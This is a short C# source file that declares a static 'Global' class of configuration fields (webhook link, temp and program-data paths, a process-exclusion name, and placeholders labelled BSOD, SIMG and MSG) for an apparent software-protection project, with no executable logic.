using System;
using System.IO;

namespace Protections.Software.Global
{
    public static class Global
    {
        public static string webhookLink = string.Empty;
        public static string path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        public static string ExcludeList = "HiIamEmptyProcessName";
        public static string tmp = Path.GetTempPath();
        public static string api = string.Empty;
        public static string ID = string.Empty;
        public static string Status = string.Empty;
        public static string SIMG = string.Empty;
        public static string BSOD = string.Empty;
        public static string rnd = string.Empty;
        public static string MSG = "0";
        public static string MSGC = string.Empty;
        public static bool flag = false;
    }
}
